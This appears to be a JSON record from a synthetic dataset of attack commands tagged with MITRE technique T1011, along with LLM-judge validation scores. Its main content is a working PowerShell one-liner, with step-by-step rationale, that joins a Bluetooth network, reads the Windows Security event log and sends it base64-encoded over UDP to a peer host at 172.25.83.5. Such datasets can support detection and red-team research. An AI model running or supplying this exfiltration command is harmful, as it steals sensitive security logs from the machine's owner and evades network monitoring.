{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
  "rationale_steps": [
    "Connect to Bluetooth NAP to establish the alternate medium.",
    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
    "Send base64 data to a high-numbered, uncommon UDP port."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
  "source_prompt_hash": "f4a0ca3c",
  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quoting/braces, valid separators, and correct cmdlet/.NET syntax.",
        "semantic_score": 2,
        "semantic_justification": "It attempts Bluetooth PAN setup and UDP exfil but likely fails without admin rights, relies on uncertain BluetoothCL NAP semantics, tries to send an oversized base64 blob in a single UDP packet, and does not meaningfully implement traffic signaling as described for T1011.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T16:35:55.450221Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed PowerShell, using correct syntax for external executable invocation, PowerShell cmdlets, .NET method calls, variable assignments, and command separators.",
        "semantic_score": 3,
        "semantic_justification": "While the command's logical flow and use of tools align well with establishing a Bluetooth PAN and exfiltrating data via UDP, several critical steps, such as setting a static IP with `netsh` and reading `Security.evtx`, require elevated privileges, directly contradicting the stated 'Privilege: None' condition.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T16:36:32.109935Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 2.5,
    "llm_average_score": 3.75,
    "llm_verdict": "uncertain",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}